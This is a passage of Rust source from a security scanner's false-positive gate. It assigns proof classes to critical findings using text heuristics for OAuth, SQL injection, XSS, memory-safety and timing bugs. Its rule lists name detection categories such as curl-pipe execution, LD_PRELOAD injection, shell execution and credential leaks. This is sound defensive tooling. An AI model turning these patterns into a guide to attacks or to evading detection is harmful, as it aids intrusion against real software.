//! False-positive proof obligation gate for critical findings.

use std::fs;
use std::path::Path;

use common::slop::{finding_has_required_proof_class, ProofClass, StructuredFinding};

const INNOVATION_LOG_PATH: &str = ".INNOVATION_LOG.md";

/// Suppress critical findings that lack a mandated proof class and append the
/// missing mathematical cure to `.INNOVATION_LOG.md`.
pub fn enforce_false_positive_proof_obligation(
    findings: &[StructuredFinding],
) -> Vec<StructuredFinding> {
    let mut kept = Vec::with_capacity(findings.len());
    let mut proposals = Vec::new();

    for finding in findings {
        if !requires_proof_obligation(finding) {
            kept.push(finding.clone());
            continue;
        }
        if let Some(upgraded) = upgrade_implicit_reachability_proof(finding) {
            kept.push(upgraded);
            continue;
        }
        if proof_obligation_missing(true, finding_has_required_proof_class(finding)) {
            proposals.push(proposal_block_for(finding));
            continue;
        }
        kept.push(finding.clone());
    }

    if !proposals.is_empty() {
        let _ = append_gap_proposals_to(Path::new(INNOVATION_LOG_PATH), &proposals);
    }

    kept
}

/// Pure helper for tests and formal assurance.
pub fn proof_obligation_missing(requires_proof: bool, has_proof_class: bool) -> bool {
    requires_proof && !has_proof_class
}

fn requires_proof_obligation(finding: &StructuredFinding) -> bool {
    matches!(
        finding.severity.as_deref(),
        Some("KevCritical") | Some("Critical")
    )
}

fn upgrade_implicit_reachability_proof(finding: &StructuredFinding) -> Option<StructuredFinding> {
    if finding_has_required_proof_class(finding) {
        return None;
    }
    let mut upgraded = finding.clone();
    upgraded.proof_class = Some(if finding.exploit_witness.is_some() {
        ProofClass::ReachabilityProof
    } else if is_self_proving_invariant(finding) {
        ProofClass::InvariantViolationProof
    } else if is_lattice_gap_synthesizable_rule(&finding.id) {
        ProofClass::LatticeGapProposal
    } else {
        return None;
    });
    Some(upgraded)
}

/// Returns `true` for rules whose classify_* functions exist but are not
/// yet wired at the detector emission site. The gate synthesizes a deterministic
/// `LatticeGapProposal` so findings pass ledger routing instead of being
/// suppressed with an INNOVATION_LOG entry.
fn is_lattice_gap_synthesizable_rule(id: &str) -> bool {
    let id = id.to_ascii_lowercase();
    [
        "non_constant_time_comparison",
        "lcm_use_after_free",
        "lcm_malloc_integer_truncation",
        "lcm_off_by_one_loop",
        "lcm_double_free",
        "raw_pointer_deref",
        "oauth_account_fusion_pretakeover",
        "react_xss_dangerous_html",
        "intent_divergence",
        "mcp_confused_deputy_dispatch",
        "ffi_memory_corruption",
        "ffi_unsafe_deref_unguarded",
        "bounded_overflow_witness",
        "ld_preload_injection",
        // P17-3C: blockchain-class rules (Batch 3)
        "oracle_price_manipulation",
        "signature_replay",
        "unprotected_authority_transition",
        "flash_loan_callback_unvalidated_sender",
        "reentrancy",
        "unsafe_delegatecall",
        // P17-3A: Batch 4 — mixed-surface rules
        "code_execution",
        "nonce_reuse",
        "unsafe_transmute",
        "curl_pipe_execution",
        "cmake_execute_process_injection",
        "open_cidr_exposure",
        "xxe_external_entity",
    ]
    .iter()
    .any(|needle| id.contains(needle))
}

/// Seal a finding with `LatticeGapProposal` when the owning detector for one of
/// the P17-3A target rules did not assign a proof class. Call this at the
/// detector emission site after construction.
pub fn seal_with_lattice_gap_proof(mut finding: StructuredFinding) -> StructuredFinding {
    if finding.proof_class.is_none() && is_lattice_gap_synthesizable_rule(&finding.id) {
        finding.proof_class = Some(ProofClass::LatticeGapProposal);
    }
    finding
}

fn is_self_proving_invariant(finding: &StructuredFinding) -> bool {
    let id = finding.id.to_ascii_lowercase();
    [
        "credential",
        "secret",
        "api_key",
        "command_injection",
        "runtime_exec",
        "shell_exec",
        "tls_verification_bypass",
        "optimizer_phantom_authority",
        "clock_skew_auth_split_brain",
        "dma_revocation_shadow_access",
        "probabilistic_llm_hijack",
    ]
    .iter()
    .any(|needle| id.contains(needle))
}

fn proposal_block_for(finding: &StructuredFinding) -> String {
    let finding_id = finding.id.trim();
    let safe_slug = finding_id.replace(':', "_");
    let location = match (finding.file.as_deref(), finding.line) {
        (Some(file), Some(line)) => format!("{file}:{line}"),
        (Some(file), None) => file.to_string(),
        _ => "unknown_location".to_string(),
    };
    format!(
        "\n### P17-3A — Proof Obligation Cure for {finding_id}\n\n\
**The gap**: `{finding_id}` reached triage at `{location}` without a mandatory \
`ReachabilityProof`, `InvariantViolationProof`, or `LatticeGapProposal`, so the \
engine could emit a plausible but unprovable critical report.\n\n\
**Build**: Extend `crates/forge/src/proof_obligation.rs` and the owning detector \
for `{safe_slug}` so the finding carries exactly one proof class before it reaches \
ledger routing. If the detector cannot prove reachability or invariant failure, \
it must synthesize a deterministic `LatticeGapProposal` instead of surfacing the \
finding.\n\n\
**Rust mathematics**: proof-state typestates for finding emission, sealed \
evidence enums, monotonic suppression before ledger serialization, and a \
deterministic fixture pair proving both suppression-without-proof and \
preservation-with-proof.\n"
    )
}

/// Pure boolean predicate for Kani verification of intent-divergence proof logic.
///
/// Returns `true` iff the zero-auth indicator is present in a non-test path,
/// meaning the `UnauthenticatedAuthProvider` path is production-reachable.
pub fn intent_divergence_is_reachable(has_unauth_indicator: bool, in_test_path: bool) -> bool {
    has_unauth_indicator && !in_test_path
}

/// Pure boolean predicate for Kani verification of FFI deref proof classification.
///
/// | `has_null_guard` | `has_extern_c` | returns                    |
/// |---|---|---|
/// | `true`  | any    | `InvariantViolationProof`  |
/// | `false` | `true` | `ReachabilityProof`        |
/// | `false` | `false`| `LatticeGapProposal`       |
pub fn ffi_deref_guard_classification(has_null_guard: bool, has_extern_c: bool) -> ProofClass {
    if has_null_guard {
        return ProofClass::InvariantViolationProof;
    }
    if has_extern_c {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Classify the proof state for a `security:intent_divergence` finding.
///
/// Inspects the source file for zero-auth provider indicators outside test
/// contexts. Returns [`ProofClass::ReachabilityProof`] when production-reachable
/// indicators are present, [`ProofClass::LatticeGapProposal`] otherwise.
pub fn classify_intent_divergence_proof(finding: &StructuredFinding, source: &str) -> ProofClass {
    let has_unauth_indicator = source.contains("requires_openai_auth: false")
        || source.contains("UnauthenticatedAuthProvider");
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| p.contains("test") || p.ends_with("_test.rs") || p.contains("spec"))
        .unwrap_or(false);
    if intent_divergence_is_reachable(has_unauth_indicator, in_test_path) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Classify the proof state for a `security:ffi_unsafe_deref_unguarded` finding.
///
/// Scans a ±5-line window around `finding_line` for a null-guard pattern and a
/// ±10-line window for `extern "C"` reachability. See [`ffi_deref_guard_classification`]
/// for the classification table. When `InvariantViolationProof` is returned, the
/// caller should suppress the finding (null guard makes it safe).
pub fn classify_ffi_deref_proof(source: &str, finding_line: usize) -> ProofClass {
    let lines: Vec<&str> = source.lines().collect();
    if lines.is_empty() {
        return ProofClass::LatticeGapProposal;
    }
    let target = finding_line
        .saturating_sub(1)
        .min(lines.len().saturating_sub(1));

    let guard_start = target.saturating_sub(5);
    let guard_end = (target + 6).min(lines.len());
    let has_null_guard = lines[guard_start..guard_end].iter().any(|l| {
        let t = l.trim();
        t.contains(".is_null()") || t.contains("is_null(ptr") || t.contains("ptr::null()")
    });

    let ext_start = target.saturating_sub(10);
    let ext_end = (target + 11).min(lines.len());
    let has_extern_c = lines[ext_start..ext_end].iter().any(|l| {
        let t = l.trim();
        t.contains("extern \"C\"") || t.starts_with("pub extern")
    });

    ffi_deref_guard_classification(has_null_guard, has_extern_c)
}

/// Pure boolean predicate for Kani verification of LCM double-free proof logic.
///
/// Returns `true` when the allocation site is reachable from an external call
/// path without a dominance-verified free guard.
pub fn lcm_double_free_is_reachable(has_free_guard: bool, in_test_path: bool) -> bool {
    !has_free_guard && !in_test_path
}

/// Classify proof class for `security:lcm_double_free` findings.
///
/// Searches ±5 lines for a null/guard check before the free call
/// (`InvariantViolationProof` → suppress as FP). Searches ±10 lines for an
/// extern function wrapper or known-exported symbol (`ReachabilityProof`).
/// Falls back to `LatticeGapProposal`.
pub fn classify_lcm_double_free_proof(source: &str, finding_line: usize) -> ProofClass {
    let lines: Vec<&str> = source.lines().collect();
    if lines.is_empty() {
        return ProofClass::LatticeGapProposal;
    }
    let target = finding_line
        .saturating_sub(1)
        .min(lines.len().saturating_sub(1));
    let guard_start = target.saturating_sub(5);
    let guard_end = (target + 6).min(lines.len());
    let has_free_guard = lines[guard_start..guard_end].iter().any(|l| {
        let t = l.trim();
        (t.contains("if (") && (t.contains("!= NULL") || t.contains("!= 0") || t.contains("freed")))
            || t.contains("assert(")
    });
    let ext_start = target.saturating_sub(10);
    let ext_end = (target + 11).min(lines.len());
    let has_extern = lines[ext_start..ext_end].iter().any(|l| {
        let t = l.trim();
        t.starts_with("static ") || t.contains("SECP256K1_API") || t.contains("lcm_")
    });
    if has_free_guard {
        ProofClass::InvariantViolationProof
    } else if has_extern {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of timing-comparison proof logic.
///
/// Returns `true` when a non-constant-time comparison is on a secret path
/// (MAC, HMAC, session key, signature) NOT in a test or benchmark context.
pub fn timing_comparison_is_sensitive(has_secret_marker: bool, in_bench_or_test: bool) -> bool {
    has_secret_marker && !in_bench_or_test
}

/// Classify proof class for `security:non_constant_time_comparison` findings.
///
/// Priority order:
/// 1. If `subtle.ConstantTimeCompare` or `hmac.Equal(` is visible in a ±10-line
///    window → `InvariantViolationProof` (guard present, suppress as FP).
/// 2. Else if HMAC/session-key markers present and not in a test/bench path →
///    `ReachabilityProof`.
/// 3. Otherwise → `LatticeGapProposal`.
pub fn classify_timing_comparison_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let finding_line = finding.line.unwrap_or(1) as usize;
    let lines: Vec<&str> = source.lines().collect();
    if !lines.is_empty() {
        let target = finding_line
            .saturating_sub(1)
            .min(lines.len().saturating_sub(1));
        let start = target.saturating_sub(10);
        let end = (target + 11).min(lines.len());
        let window: String = lines[start..end].join("\n");
        if window.contains("subtle.ConstantTimeCompare")
            || window.contains("hmac.Equal(")
            || window.contains("check_password_hash(")
            || window.contains("hmac.compare_digest(")
            || window.contains("MessageDigest.isEqual(")
            || window.contains("Arrays.constantTimeAreEqual(")
            || window.contains("constantTimeCompare(")
            || window.contains("MessageDigest.equals(")
        {
            return ProofClass::InvariantViolationProof;
        }
    }
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.ends_with("_test.go")
                || p.contains("bench")
                || p.ends_with("Test.java")
                || p.ends_with("Spec.java")
                || p.contains("test/")
        })
        .unwrap_or(false);
    let has_secret_marker = source.contains("hmac")
        || source.contains("HMAC")
        || source.contains("session_key")
        || source.contains("auth_tag")
        || source.contains("nonce")
        || source.contains("rawPassword")
        || source.contains("secretId")
        || source.contains("SecretId")
        || source.contains("secretKey")
        || source.contains("SecretKey")
        || source.contains("PasswordHash")
        || source.contains("passwordHash");
    if timing_comparison_is_sensitive(has_secret_marker, in_test_path) {
        return ProofClass::ReachabilityProof;
    }
    // Go: bytes.Equal on secret material without a constant-time guard.
    // Narrow to bytes.Equal only — broad == + keyword checks FP on algorithm
    // name constants (e.g., zitadel passwap.go HashNameArgon2 = "argon2").
    if !in_test_path {
        let has_go_timing_sink = source.contains("bytes.Equal(");
        let has_go_constant_time_guard = source.contains("subtle.ConstantTimeCompare(")
            || source.contains("hmac.Equal(")
            || source.contains("subtle.ConstantTimeByteEq(");
        if has_go_timing_sink && !has_go_constant_time_guard {
            return ProofClass::ReachabilityProof;
        }
    }
    ProofClass::LatticeGapProposal
}

/// Pure boolean predicate for Kani verification of use-after-free proof logic.
///
/// Returns `true` when the allocation site is reachable from an external call
/// path and no lifetime guard dominates the reuse point.
pub fn lcm_use_after_free_is_reachable(has_lifetime_guard: bool, in_test_path: bool) -> bool {
    !has_lifetime_guard && !in_test_path
}

/// Classify proof class for `security:lcm_use_after_free` findings.
///
/// 1. ±5-line window: presence of a null/validity check or `secp256k1_ec_pubkey_tweak`
///    guard → `InvariantViolationProof` (suppress as FP).
/// 2. ±10-line window: `SECP256K1_API`, `secp256k1_` symbol, or `static` linkage
///    → `ReachabilityProof`.
/// 3. Otherwise → `LatticeGapProposal`.
pub fn classify_lcm_use_after_free_proof(source: &str, finding_line: usize) -> ProofClass {
    let lines: Vec<&str> = source.lines().collect();
    if lines.is_empty() {
        return ProofClass::LatticeGapProposal;
    }
    let target = finding_line
        .saturating_sub(1)
        .min(lines.len().saturating_sub(1));
    let guard_start = target.saturating_sub(5);
    let guard_end = (target + 6).min(lines.len());
    let has_lifetime_guard = lines[guard_start..guard_end].iter().any(|l| {
        let t = l.trim();
        (t.contains("if (")
            && (t.contains("!= NULL") || t.contains("freed") || t.contains("is_valid")))
            || t.contains("assert(")
            || t.contains("secp256k1_ec_pubkey_tweak")
    });
    let ext_start = target.saturating_sub(10);
    let ext_end = (target + 11).min(lines.len());
    let has_extern = lines[ext_start..ext_end].iter().any(|l| {
        let t = l.trim();
        t.starts_with("static ") || t.contains("SECP256K1_API") || t.contains("secp256k1_")
    });
    if has_lifetime_guard {
        ProofClass::InvariantViolationProof
    } else if has_extern {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of malloc integer-truncation
/// proof logic.
///
/// Returns `true` when the allocation size computation is unguarded and the
/// finding is NOT in a benchmark or precompute-table path.
pub fn lcm_malloc_integer_truncation_is_exploitable(
    has_size_guard: bool,
    in_bench_path: bool,
) -> bool {
    !has_size_guard && !in_bench_path
}

/// Classify proof class for `security:lcm_malloc_integer_truncation` findings.
///
/// 1. Bench/precompute path OR ±5-line overflow guard → `InvariantViolationProof`
///    (suppress as FP).
/// 2. ±10-line `SECP256K1_API` / `secp256k1_` / `static` linkage →
///    `ReachabilityProof`.
/// 3. Otherwise → `LatticeGapProposal`.
pub fn classify_lcm_malloc_integer_truncation_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let finding_line = finding.line.unwrap_or(1) as usize;
    let lines: Vec<&str> = source.lines().collect();
    if lines.is_empty() {
        return ProofClass::LatticeGapProposal;
    }
    let target = finding_line
        .saturating_sub(1)
        .min(lines.len().saturating_sub(1));
    let guard_start = target.saturating_sub(5);
    let guard_end = (target + 6).min(lines.len());
    let has_size_guard = lines[guard_start..guard_end].iter().any(|l| {
        let t = l.trim();
        (t.contains("if (")
            && (t.contains("size >")
                || t.contains("len >")
                || t.contains("overflow")
                || t.contains("UINT_MAX")))
            || t.contains("assert(")
            || t.contains("checked_mul")
            || t.contains("safe_mul")
    });
    let in_bench_path = finding
        .file
        .as_deref()
        .map(|p| p.contains("bench") || p.contains("precompute"))
        .unwrap_or(false);
    if has_size_guard || in_bench_path {
        return ProofClass::InvariantViolationProof;
    }
    let ext_start = target.saturating_sub(10);
    let ext_end = (target + 11).min(lines.len());
    let has_extern = lines[ext_start..ext_end].iter().any(|l| {
        let t = l.trim();
        t.starts_with("static ") || t.contains("SECP256K1_API") || t.contains("secp256k1_")
    });
    if has_extern {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of off-by-one loop proof logic.
///
/// Returns `true` when the loop boundary arithmetic is unguarded and the
/// finding is NOT in a test or benchmark path.
pub fn lcm_off_by_one_loop_is_exploitable(has_bounds_check: bool, in_test_or_bench: bool) -> bool {
    !has_bounds_check && !in_test_or_bench
}

/// Classify proof class for `security:lcm_off_by_one_loop` findings.
///
/// 1. Bench/test path OR ±5-line bounds-check guard → `InvariantViolationProof` (suppress).
/// 2. ±10-line C exported function signature (`int `, `void `, `SECP256K1_API`, etc.)
///    → `ReachabilityProof`.
/// 3. Otherwise → `LatticeGapProposal`.
pub fn classify_lcm_off_by_one_loop_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let finding_line = finding.line.unwrap_or(1) as usize;
    let lines: Vec<&str> = source.lines().collect();
    if lines.is_empty() {
        return ProofClass::LatticeGapProposal;
    }
    let target = finding_line
        .saturating_sub(1)
        .min(lines.len().saturating_sub(1));
    let guard_start = target.saturating_sub(5);
    let guard_end = (target + 6).min(lines.len());
    let has_bounds_check = lines[guard_start..guard_end].iter().any(|l| {
        let t = l.trim();
        (t.contains("if (")
            && (t.contains("< len")
                || t.contains("<= len")
                || t.contains("< size")
                || t.contains("BLOCK_SIZE")))
            || t.contains("assert(")
            || t.contains("ASSERT(")
    });
    let in_test_or_bench = finding
        .file
        .as_deref()
        .map(|p| p.contains("test") || p.contains("bench") || p.contains("Test"))
        .unwrap_or(false);
    if has_bounds_check || in_test_or_bench {
        return ProofClass::InvariantViolationProof;
    }
    let ext_start = target.saturating_sub(10);
    let ext_end = (target + 11).min(lines.len());
    let has_extern = lines[ext_start..ext_end].iter().any(|l| {
        let t = l.trim();
        t.starts_with("static ")
            || t.contains("SECP256K1_API")
            || t.contains("secp256k1_")
            || t.starts_with("int ")
            || t.starts_with("void ")
    });
    if has_extern {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of OAuth state-validation proof logic.
///
/// Returns `true` when a browser callback is visible, no state check is present,
/// and the path is not a known non-callback OAuth context.
pub fn oauth_state_validation_is_missing(
    has_browser_callback: bool,
    has_state_check: bool,
    in_non_callback_context: bool,
) -> bool {
    has_browser_callback && !has_state_check && !in_non_callback_context
}

/// Classify proof class for `security:oauth_missing_state_validation` findings.
///
/// 1. Test/script/generated/migration/token/provider/storage context →
///    `InvariantViolationProof` (suppress).
/// 2. Non-server-side file → `LatticeGapProposal` (client-only code exchange
///    is not a server-side OAuth callback without an SSR route proof).
/// 3. Server-side browser callback with a visible state check →
///    `InvariantViolationProof` (suppress).
/// 4. Server-side browser callback with NO state check → `ReachabilityProof`.
/// 5. Server-side code exchange without a callback marker → `LatticeGapProposal`.
pub fn classify_oauth_state_validation_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path = finding.file.as_deref().unwrap_or_default();
    let path_lower = path.to_ascii_lowercase();
    let in_non_callback_context = path_lower.contains("test")
        || path_lower.contains("scripts/")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("generated")
        || path_lower.contains("migrations/")
        || path_lower.contains("migration")
        || path_lower.contains("/token")
        || path_lower.contains("tokenapi")
        || path_lower.contains("token_api")
        || path_lower.contains("token_")
        || path_lower.contains("token-")
        || path_lower.contains("token.")
        || path_lower.contains("provider")
        || path_lower.contains("/client")
        || path_lower.contains("sdk")
        || path_lower.contains("storage")
        || path_lower.contains("/model")
        || path_lower.contains("/models");
    if in_non_callback_context {
        return ProofClass::InvariantViolationProof;
    }

    let is_server_side = finding
        .file
        .as_deref()
        .map(|p| {
            p.ends_with(".py")
                || p.ends_with(".go")
                || p.ends_with(".rb")
                || p.ends_with(".java")
                || p.ends_with(".php")
                || p.ends_with(".kt")
        })
        .unwrap_or(false);
    if !is_server_side {
        return ProofClass::LatticeGapProposal;
    }

    // For Java files, require HTTP-handler context before emitting ReachabilityProof.
    // Constants files, SPI interfaces, and scripting utilities (e.g., Keycloak
    // OAuth2Constants.java, Authenticator.java, Script.java) are not callback handlers
    // and produce false positives without this gate.
    let is_java = finding
        .file
        .as_deref()
        .map(|p| p.ends_with(".java") || p.ends_with(".kt"))
        .unwrap_or(false);
    if is_java {
        let source_lower_java = source.to_ascii_lowercase();
        let has_http_handler_path = path_lower.contains("controller")
            || path_lower.contains("handler")
            || path_lower.contains("endpoint")
            || path_lower.contains("servlet")
            || path_lower.contains("resource")
            || path_lower.contains("filter");
        let has_http_framework_annotation = source_lower_java.contains("javax.ws.rs")
            || source_lower_java.contains("jakarta.ws.rs")
            || source_lower_java.contains("@requestmapping")
            || source_lower_java.contains("@getmapping")
            || source_lower_java.contains("@postmapping")
            || source_lower_java.contains("httpservletrequest")
            || source_lower_java.contains("serverhttprequest");
        if !has_http_handler_path && !has_http_framework_annotation {
            return ProofClass::LatticeGapProposal;
        }
    }

    let source_lower = source.to_ascii_lowercase();
    let has_browser_callback = source_lower.contains("request.args.get(\"code\")")
        || source_lower.contains("request.args.get('code')")
        || source_lower.contains("request.values.get(\"code\")")
        || source_lower.contains("request.values.get('code')")
        || source_lower.contains("request.getparameter(\"code\")")
        || source_lower.contains("getparameter(\"code\")")
        || source_lower.contains("r.url.query().get(\"code\")")
        || source_lower.contains(".url.query().get(\"code\")")
        || source_lower.contains("query().get(\"code\")")
        || source_lower.contains("query.get(\"code\")")
        || source_lower.contains("query.get('code')")
        || source_lower.contains("params[:code]")
        || source_lower.contains("params[\"code\"]")
        || source_lower.contains("params['code']");
    let has_session_state_binding = (source_lower.contains("session")
        || source_lower.contains("cookie")
        || source_lower.contains("csrf")
        || source_lower.contains("nonce"))
        && source_lower.contains("state")
        && (source_lower.contains("==")
            || source_lower.contains("!=")
            || source_lower.contains(".equals(")
            || source_lower.contains("compare_digest")
            || source_lower.contains("secure_compare"));
    let has_state_check = source_lower.contains("session.get(\"oauth_state\")")
        || source_lower.contains("session.get('oauth_state')")
        || source_lower.contains("state_parameter")
        || source_lower.contains("verify_state(")
        || source_lower.contains("validate_state(")
        || source_lower.contains("check_state(")
        || source_lower.contains("oauth_state")
        || source_lower.contains("csrf_token")
        || source_lower.contains("request_verifier")
        || source_lower.contains("pkce_verifier")
        || has_session_state_binding;
    if has_state_check {
        ProofClass::InvariantViolationProof
    } else if oauth_state_validation_is_missing(
        has_browser_callback,
        has_state_check,
        in_non_callback_context,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of OAuth account-fusion proof logic.
///
/// Returns `true` when the OAuth merge callback is server-side AND no
/// `email_verified` guard is visible in the surrounding code.
pub fn oauth_account_fusion_is_missing_email_guard(
    is_server_side: bool,
    has_email_verified_check: bool,
) -> bool {
    is_server_side && !has_email_verified_check
}

/// Classify proof class for `security:oauth_account_fusion_pretakeover` findings.
///
/// 1. Non-server-side file (TypeScript/JavaScript SDK resource wrapper) →
///    `LatticeGapProposal` (client-side SDK method wrappers are not server-side
///    OAuth account-merge handlers).
/// 2. Server-side file (Python/Go/Ruby/Java) with visible `email_verified`
///    guard → `InvariantViolationProof` (suppress).
/// 3. Server-side file with NO email-guard → `ReachabilityProof`.
pub fn classify_oauth_account_fusion_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let is_server_side = finding
        .file
        .as_deref()
        .map(|p| {
            p.ends_with(".py") || p.ends_with(".go") || p.ends_with(".rb") || p.ends_with(".java")
        })
        .unwrap_or(false);
    if !is_server_side {
        return ProofClass::LatticeGapProposal;
    }
    let has_email_check = source.contains("email_verified")
        || source.contains("emailVerified")
        || source.contains("verify_email(")
        || source.contains("is_email_verified");
    if has_email_check {
        ProofClass::InvariantViolationProof
    } else {
        ProofClass::ReachabilityProof
    }
}

/// Pure boolean predicate for Kani verification of protobuf Any unguarded-decode proof logic.
///
/// Returns `true` when the deprecated `ptypes.UnmarshalAny` API is used AND
/// the file is NOT in a test/mock/fixture/mirage path.
pub fn protobuf_any_is_unguarded(uses_deprecated_api: bool, in_test_path: bool) -> bool {
    uses_deprecated_api && !in_test_path
}

/// Classify proof class for `security:protobuf_any_unguarded_decode` findings.
///
/// 1. Test/mock/fixture/mirage path → `InvariantViolationProof` (suppress).
/// 2. Deprecated `ptypes.UnmarshalAny` or `proto.UnmarshalAny` → `ReachabilityProof`
///    (type registry not enforced; remote type injection possible).
/// 3. Modern `anypb.UnmarshalTo`/`anypb.UnmarshalNew` WITH type-URL allow-list
///    check → `InvariantViolationProof` (suppress).
/// 4. Modern API without type-URL check → `ReachabilityProof`.
/// 5. Neither pattern detected → `LatticeGapProposal`.
pub fn classify_protobuf_any_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.contains("mock")
                || p.contains("fixture")
                || p.contains("mirage")
        })
        .unwrap_or(false);
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }
    let uses_deprecated =
        source.contains("ptypes.UnmarshalAny") || source.contains("proto.UnmarshalAny");
    let uses_modern = source.contains("anypb.UnmarshalTo") || source.contains("anypb.UnmarshalNew");
    if uses_deprecated {
        ProofClass::ReachabilityProof
    } else if uses_modern {
        let has_type_check = source.contains("typeURL")
            || source.contains("TypeUrl")
            || source.contains("RegisterType")
            || source.contains("type_url_prefix");
        if has_type_check {
            ProofClass::InvariantViolationProof
        } else {
            ProofClass::ReachabilityProof
        }
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when a SQL concatenation finding is genuinely injectable:
/// raw concatenation present and NOT inside a migration/test path.
pub fn sqli_concat_is_injectable(is_raw_concat: bool, in_migration_path: bool) -> bool {
    is_raw_concat && !in_migration_path
}

/// Classifies a `security:sqli_concatenation` finding into a `ProofClass`.
///
/// - Test/mock/fixture file path → `InvariantViolationProof` (suppress)
/// - Parameterized-query marker in source → `InvariantViolationProof` (suppress)
/// - Raw SQL string concatenation or `fmt.Sprintf` with SQL keyword → `ReachabilityProof`
/// - Otherwise → `LatticeGapProposal`
pub fn classify_sqli_concatenation_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.contains("mock")
                || p.contains("fixture")
                || p.ends_with("_test.go")
                || p.ends_with("Test.java")
        })
        .unwrap_or(false);
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let has_parameterized = source.contains("$1")
        || source.contains("$2")
        || source.contains("Prepare(")
        || source.contains("stmt.Exec(")
        || source.contains("sqlx::query!")
        || source.contains("PreparedStatement")
        || source.contains("db.Prepare(")
        || source.contains("Query($")
        || source.contains("NamedQuery(")
        || source.contains("sqlx::query_as!");
    if has_parameterized {
        return ProofClass::InvariantViolationProof;
    }

    let has_raw_concat = source.contains("+ \"")
        && (source.contains("SELECT")
            || source.contains("INSERT")
            || source.contains("UPDATE")
            || source.contains("DELETE")
            || source.contains("WHERE")
            || source.contains("FROM"));
    let has_fmt_sprintf = source.contains("fmt.Sprintf")
        && (source.contains("SELECT")
            || source.contains("WHERE")
            || source.contains("INSERT")
            || source.contains("DELETE"));
    let has_string_format = source.contains("String.format(")
        && (source.contains("SELECT") || source.contains("WHERE"));
    if has_raw_concat || has_fmt_sprintf || has_string_format {
        return ProofClass::ReachabilityProof;
    }
    ProofClass::LatticeGapProposal
}

/// Returns `true` when financial PII flows to an LLM sink without a masking guard.
pub fn financial_pii_is_unguarded(has_pii_sink: bool, has_masking_guard: bool) -> bool {
    has_pii_sink && !has_masking_guard
}

/// Classifies a `security:financial_pii_to_external_llm` finding into a `ProofClass`.
///
/// - Test/mock/fixture file path → `InvariantViolationProof` (suppress)
/// - Masking/redaction guard present → `InvariantViolationProof` (suppress)
/// - PII field name AND LLM sink both present → `ReachabilityProof`
/// - Otherwise → `LatticeGapProposal`
pub fn classify_financial_pii_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| p.contains("test") || p.contains("mock") || p.contains("fixture"))
        .unwrap_or(false);
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let has_masking = source.contains("redact(")
        || source.contains("mask_pii(")
        || source.contains("anonymize(")
        || source.contains("scrub_pii(")
        || source.contains("[REDACTED]")
        || source.contains("pii_filter")
        || source.contains("DataMasker")
        || source.contains("sanitize_pii(")
        || source.contains("strip_pii(")
        || source.contains("hash_pii(");
    if has_masking {
        return ProofClass::InvariantViolationProof;
    }

    let has_pii = source.contains("ssn")
        || source.contains("credit_card")
        || source.contains("card_number")
        || source.contains("account_number")
        || source.contains("routing_number")
        || source.contains("tax_id")
        || source.contains("social_security")
        || source.contains("bank_account");
    let has_llm_sink = source.contains("openai.com")
        || source.contains("anthropic.com")
        || source.contains("api.openai")
        || source.contains("ChatCompletion")
        || source.contains("client.chat")
        || source.contains("llm_gateway")
        || source.contains("ws.WriteMessage(")
        || source.contains("sendToLLM");
    if has_pii && has_llm_sink {
        return ProofClass::ReachabilityProof;
    }
    ProofClass::LatticeGapProposal
}

/// Returns `true` when a React XSS finding is genuinely unguarded:
/// `dangerouslySetInnerHTML` present and NOT sanitized.
pub fn react_xss_is_unguarded(has_dangerous_html: bool, has_sanitizer: bool) -> bool {
    has_dangerous_html && !has_sanitizer
}

/// Classifies a `security:react_xss_dangerous_html` finding into a `ProofClass`.
///
/// - Test/spec file path → `InvariantViolationProof` (suppress)
/// - Sanitizer present (DOMPurify, sanitizeHtml, etc.) → `InvariantViolationProof` (suppress)
/// - `dangerouslySetInnerHTML` / `innerHTML` sink + user-input indicator → `ReachabilityProof`
/// - Otherwise → `LatticeGapProposal`
pub fn classify_react_xss_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.contains("__tests__")
                || p.contains(".spec.")
                || p.contains(".test.")
        })
        .unwrap_or(false);
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }
    let has_sanitizer = source.contains("DOMPurify.sanitize(")
        || source.contains("sanitizeHtml(")
        || source.contains("purify.sanitize(")
        || source.contains("escapeHtml(")
        || source.contains("stripHtml(")
        || source.contains("xss(")
        || source.contains("sanitize(");
    if has_sanitizer {
        return ProofClass::InvariantViolationProof;
    }
    let has_dangerous_html = source.contains("dangerouslySetInnerHTML")
        || source.contains("innerHTML =")
        || source.contains("__html:");
    let has_user_input = source.contains("props.")
        || source.contains("state.")
        || source.contains("useState")
        || source.contains("useSelector")
        || source.contains("message")
        || source.contains("content")
        || source.contains("body");
